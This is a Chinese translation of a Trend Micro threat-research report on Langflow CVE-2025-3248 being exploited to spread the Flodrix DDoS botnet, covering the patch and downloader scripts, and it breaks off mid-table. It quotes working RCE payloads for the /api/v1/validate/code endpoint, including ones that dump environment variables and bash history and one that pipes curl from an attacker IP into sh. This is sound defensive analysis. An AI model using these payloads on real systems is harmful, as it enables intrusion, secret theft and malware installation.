---
title: 关键LangFlow漏洞（CVE-2025-3248）被积极利用来传播Flodrix僵尸网络
url: https://www.anquanke.com/post/id/308522
source: 安全客-有思想的安全新媒体
date: 2025-06-18
fetch_date: 2025-10-06T22:51:59.714666
---

# 关键LangFlow漏洞（CVE-2025-3248）被积极利用来传播Flodrix僵尸网络

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 关键LangFlow漏洞（CVE-2025-3248）被积极利用来传播Flodrix僵尸网络

阅读量**82781**

发布时间 : 2025-06-17 15:00:06

**x**

##### 译文声明

本文是翻译文章，文章原作者 Aliakbar Zahravi、Ahmed Mohamed Ibrahim、Sunil Bharti、Shubham Singh，文章来源：trendmicro

原文地址：<https://www.trendmicro.com/en_us/research/25/f/langflow-vulnerability-flodric-botnet.html>

译文仅供参考，具体内容表达以及含义原文为准。

* Trend™ Research 发现了一个利用 CVE-2025-3248 传播 Flodrix 僵尸网络的活跃活动。攻击者利用该漏洞在受感染的 Langflow 服务器上执行下载程序脚本，进而获取并安装 Flodrix 恶意软件。
* CVE-2025-3248 （CVSS 9.8） 是 1.3.0 之前的 Langflow 版本中的一个严重漏洞。在公共网络上使用 Langflow 1.3.0 之前的版本的组织面临严重风险，因为此漏洞正在被广泛利用。Langflow 在原型设计和部署智能自动化方面的广泛采用使易受攻击的部署成为有吸引力的目标。
* 如果漏洞被成功利用，Flodrix 僵尸网络背后的威胁行为者可能会导致整个系统受损、DDoS 攻击，并可能丢失或泄露受影响 Langflow 服务器上托管的敏感信息。
* 运行 Langflow 的组织应立即修补并升级到版本 1.3.0 或更高版本，限制对 Langflow 终端节点的公有访问，并监控与 Flodrix 僵尸网络相关的入侵指标。
* 通过可用的 Trend Vision One™ Network Security 规则和过滤器，可以保护 Trend Micro 客户免受漏洞利用企图的攻击。Trend Vision One 客户还可以访问搜寻查询、威胁洞察和威胁情报报告，以获得有关此攻击的丰富上下文和最新更新。这些保护详细信息可以在本文末尾找到。

本博客详细介绍了对一个活跃活动的研究和分析，该活动利用了未经身份验证的关键远程代码执行 （RCE） 漏洞 CVE-2025-3248，该漏洞已在 1.3.0 之前的 Langflow 版本中被发现。

Langflow 是一个由 Python 提供支持的可视化框架，用于构建具有超过 70,000 个 GitHub 星星的 AI 应用程序，其 1.3.0 之前的版本在其代码验证机制中存在允许任意代码执行的缺陷。未经身份验证的攻击者可以通过向 */api/v1/validate/code* 端点构建恶意 POST 请求来利用此漏洞。

我们调查中的恶意负载被发现嵌入在 Python 函数定义的参数默认值或装饰器中。由于 Langflow 不强制执行输入验证或沙盒，因此这些有效负载在服务器的上下文中编译和执行，从而导致 RCE。

美国网络安全和基础设施安全局 （CISA） 于 2025 年 5 月 5 日将此漏洞添加到其已知利用漏洞 （KEV） 目录中。表 1 总结了我们在本博客中进一步讨论的漏洞的详细信息。

|  |  |
| --- | --- |
| **CVE 标识符** | 漏洞提示-2025-3248 |
| **CVSS 评分** | CVSS 评分：9.8（严重） |
| **向量** | CVSS：3.1/AV：N/AC：L/PR：N/UI：N/S：U/C：H/I：H/A：H |
| **受影响的版本** | 1.3.0 之前的 Langflow 版本 |
| **漏洞类型** | 缺少身份验证、代码注入 |
| **冲击** | 允许未经身份验证的远程攻击者执行任意代码 |

表 1：CVE-2025-3248 漏洞详情

CVE-2025-3248 漏洞利用技术分析

![图 1.观察到的攻击图显示了 CVE-2025-3248 如何被用于命令和控制。]()

图 1.观察到的攻击图显示了 CVE-2025-3248 如何被用于命令和控制。

根据我们的调查和命令执行时间表，网络犯罪分子首先收集了公开暴露的 Langflow 服务器的 IP 地址和端口列表，可能使用了 Shodan 或 FOFA 等工具，从而发起了攻击。

攻击者使用 *https://github.com/verylazytech/CVE-2025-3248* 的开源代码概念验证 （PoC） 来获取易受攻击系统上的远程 shell 访问权限。然后，攻击者在受感染的系统上运行各种侦察 bash 命令，并将结果发送回命令和控制 （C&C） 服务器。

然后，攻击者在受感染的系统上下载并执行 Flodrix 僵尸网络。一旦恶意软件成功安装并与命令和控制 （C&C） 服务器建立连接，它就可以通过 TCP 接收命令以发起各种分布式拒绝服务 （DDoS） 攻击。除非提供有效的参数，否则有效负载将终止并删除自身。

根据这些步骤，攻击者可能会分析所有易受攻击的服务器，并使用收集的数据来识别未来感染的高价值目标。在调查过程中，我们观察到 trojan downloader 脚本使用无效参数执行最终负载。结果，在初始执行并建立连接后，恶意软件终止并自行删除。此行为旨在确定哪些有效载荷在目标系统架构上成功执行，并可以启动与C&C服务器的通信。

该漏洞专门存在于*/api/v1/validate/code*端点中。此终端节点旨在验证 Python 代码片段，但无法实施适当的身份验证。它首先使用 *ast.parse（）* 将用户提供的代码解析为抽象语法树 （AST） 来处理这些代码。随后，它使用 Python 的*compile（）*函数将 AST 转换为可执行字节码，然后通过 *exec（）;*执行。

恶意负载可以嵌入到这些语法结构中。当 Langflow 的 *compile（）* 函数处理表示具有此类嵌入式有效负载的函数的 AST 节点时，恶意代码会在服务器的上下文中执行。此作无需任何身份验证即可发生，从而允许远程攻击者提交精心编制的 POST 请求以实现 RCE。

![图 2.CVE-2025-3248 远程代码执行流程。]()

图 2.CVE-2025-3248 远程代码执行流程。

表 2 详细介绍了我们针对 Langflow 易受攻击的端点调查的利用尝试中的特定 Python 负载。这些有效负载嵌入在函数默认参数或装饰器中，演示了各种侦测和初始访问技术。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“whoami\”， shell=True））’）**

* **执行的命令：**whoami
* **详细信息：**标识在受感染的系统上运行 Langflow 应用程序的进程的当前用户/有效用户 ID。这是侦查中了解权限的常见第一步。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“printenv\”， shell=True））’）**

* **执行的命令：**printenv
* Details：转储所有环境变量。这可能会泄露敏感信息，例如 API 密钥、云凭证、数据库连接字符串或 Langflow 进程可访问的其他配置详细信息。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“cat /root/.bash\_history\”， shell=True））’）**

* 执行的命令：cat /root/.bash\_history
* 详细信息：尝试读取 root 用户的 Bash 历史记录文件。这可能会暴露以前执行的命令，从而深入了解系统的管理、已安装的软件或潜在的错误配置。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“ip addr show\”， shell=True））’）**

* 执行的命令：ip addr show
* 详细信息：显示在系统上配置的网络接口信息和 IP 地址。这对于网络侦查至关重要，可帮助攻击者映射内部网络并识别潜在目标或出口点。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“ifconfig\”， shell=True））’）**

* 执行的命令：ifconfig
* 详细信息：与 ip addr show 类似，它提供有关网络接口的详细信息，包括 IP 地址、MAC 地址和网络统计信息。通常用于基本网络枚举。

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“systemctl status sshd\”， shell=True））’）**

* 执行的命令：systemctl status sshd
* 详细信息：检查 SSH 守护程序服务的状态。此命令用于确定 SSH 是否正在运行，这可能表明攻击者的潜在远程访问媒介

**exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“capsh –print\”， shell=True））’）**

* 执行的命令：capsh –print
* 详细信息：显示流程的当前功能。了解进程功能（例如，CAP\_NET\_BIND\_SERVICE、CAP\_SYS\_PTRACE）可以帮助攻击者识别他们可以执行的进一步升级路径或特权作。

**‘ exec（’raise Exception（\_\_import\_\_（\“subprocess\”）.check\_output（\“curl -s http://<IP>：<PORT>/dockersh\”， shell=True））’）**

* 执行的命令：curl -s http://80.66.75.121:25565/docker | sh
* 详细信息：此命令从攻击者控制的服务器下载并执行名为 ‘docker’ 的木马下载程序脚本。

![图 3.CVE-2025-3248 RCE 流量。]()

图 3.CVE-2025-3248 RCE 流量。

我们观察到，攻击者使用 *https://github.com/verylazytech/CVE-2025-3248* 的开源代码概念验证 （PoC） 与易受攻击的系统进行交互，以便在攻击过程中实现代码执行和有效负载交付。图 4 和图 5 演示了 PoC 的用法。

![图 4.来自 GitHub PoC 的 CVE-2025-3248 的 Python 概念验证 （PoC） 代码段。]()

图 4.来自 GitHub PoC 的 CVE-2025-3248 的 Python 概念验证 （PoC） 代码段。

![图 5.CVE-2025-3248 PoC 脚本执行。]()

图 5.CVE-2025-3248 PoC 脚本执行。

然后，攻击者在受感染的系统上运行各种侦察 bash 命令，并将结果发送回 C&C 服务器。

CVE-2025-3248 补丁分析

已发布 CVE-2025-3248 的安全更新，该更新包含在 Langflow 版本 1.3.0 中。它解决了 */api/v1/validate/code* 端点中的身份验证漏洞，并通过向 *post\_validate\_code* 函数添加新参数 *\_current\_user： CurrentActiveUser*来实现身份验证要求。此参数充当身份验证依赖项，在允许访问之前验证用户的身份和会话有效性。

![图 6.CVE-2025-3248 补丁更新的日志。]()

图 6.CVE-2025-3248 补丁更新的日志。

*CurrentActiveUser*依赖项检查经过身份验证的用户会话，如果用户未通过身份验证，则会触发异常。因此，此更新可确保只有授权用户才能访问 */api/v1/validate/code* 端点。

当向 */api/v1/validate/code* 端点发出请求时，身份验证流程开始。*FastAPI* 解析函数签名并检测*\_current\_user： CurrentActiveUser* 依赖项。它立即暂停执行*post\_validate\_code。*

当 *FastAPI*调用 *CurrentActiveUser*的底层逻辑以满足依赖项时，会触发鉴权。此 logic 的主要职责是验证用户。它会检查传入的凭据请求，特别是查找：

* Authorization 标头中的 JWT Bearer 令牌。
* 在请求标头中提供或作为查询参数提供的 x-api-key的。

然后验证凭据，有两种可能的情况：

* 失败。如果找不到两种凭证类型，或者提供的令牌/密钥无效，则依赖项将引发 *HTTPException*。请求立即被拒绝，并显示 401 Unauthorized 或 403 Forbidden 错误，并且永远不会到达终端节点的代码。
* 成功。如果凭证有效，则依赖项将从数据库中检索相应的用户。

如果凭证验证成功，则会检查检索到的用户对象，以确保其 *is\_active* 标志为 true。如果用户处于非活动状态，则进程将停止并显示另一个 *HTTPException*。

仅当用户成功通过身份验证并且 active 依赖项逻辑完成时，才会授予执行。*FastAPI*认为依赖项“满足”，最后继续执行 *post\_validate\_code* 函数中的代码。

![图 7.Langflow 源码更新。]()

图 7.Langflow 源码更新。

攻击链分析

|  |  |
| --- | --- |
| **名字** | 码头工人 |
| **MD5** | eaf854b9d232566e82a805e9be8b2bf2 |
| **SHA-1** | e367cee9e02690509b4acdf7060f1a4387d85ec7 |
| **SHA-256** | ec0f2960164cdcf265ed78e66476459337c03acb469b6b302e1e8ae01c35d7ec |
| **大小** | 700 字节 |
| **文件类型** | Bash 脚本 |

表 2.Bash 脚本下载器详细信息

成功利用 CVE-2025-3248 后，威胁行为者部署了一个名为“docker”的 bash shell 脚本。此脚本旨在下载和执行针对多个系统架构的 Flodrix 僵尸网络的 ELF 二进制文件。它尝试运行带有参数 *\_docker* 的脚本 */tmp/e1x*，然后检查字符串 “*Upgrading Kernel..*” 的输出。如果存在此字符串，则条件通过，脚本将删除下载的文件。否则，将跳过这些命令。

![图 8.Bash 脚本下载器代码。]()

图 8.Bash 脚本下载器代码。

在我们的调查过程中，我们发现威胁行为者在同一主机上托管了不同的下载程序脚本 *80[.]66[.]75[.]121* 个具有相同目的的这表示正在进行积极的开发，并且多个活动正在进行中。

|  |  |
| --- | --- |
| **名字** | 迪兹 |
| **MD5** | 176f293dd15b9cf87ff1b8ba70d98bcf |
| **SHA-1** | 7823b91efceedaf0e81856c735f13ae45b494909 |
| **SHA-256** | 64927195d388bf6a1042c4d689bcb2c218320e2fa93a2dcc065571ade3bb3bd3 |
| **大小** | 5202 字节 |
| **文件类型** | Bash 脚本 |

表 3.下载程序变体详细信息。

如果进程 ID （PID） 大于 500，则脚本首先终止名为 “*busybox*”、“*systemd*” 和 “*watchdog*” 的特定进程。这种情况可能旨在避免提前启动的关键系统进程，确保脚本以动态创建的或与用户相关的进程为目标，这些进程可能会干扰其作，例如安全实用程序。

然后，它设置变量，包括 HTTP、TFTP 和 FTP 的服务器 IP 和端口，并指定与各种系统体系结构对应的多个文件名。该脚本将工作目录更改为 */tmp*，删除与 *e1x.\** 模式匹配的任何预先存在的文件，并定义多个实用程序函数。这些函数检查 *wget*、*curl* 和 *tftp* 等命令是否存在，验证它们是否执行而不被终止，并确定可用于下载文件的最佳方法。

核心功能涉及 d*ownload\_with\_fallback* 函数，该函数尝试使用各种定义的方法下载文件。如果主要方法失败，它将回退到使用辅助方法，如 *wget*或 *curl* 的 busybox 版本，以及作为最后手段的 *tftp*或 *ftpget*。

下载文件后，它会尝试使用 *execute\_file* 函数执行该文件，该函数会更改文件权限以使其可执行，并检查某些输出消息以确定执行是成功还是失败。该脚本按顺序处理每个文件，尝试下载并执行，直到成功执行。

![图 9.Downloader 变体。]()

图 9.Downloader 变体。

Flodrix 僵尸网络负载分析

|  |  |
| --- | --- |
| **名字** | e1x.x86\_64 |
| **MD5** | 82d8bc51a89118e599189b759572459f |
| **SHA-1...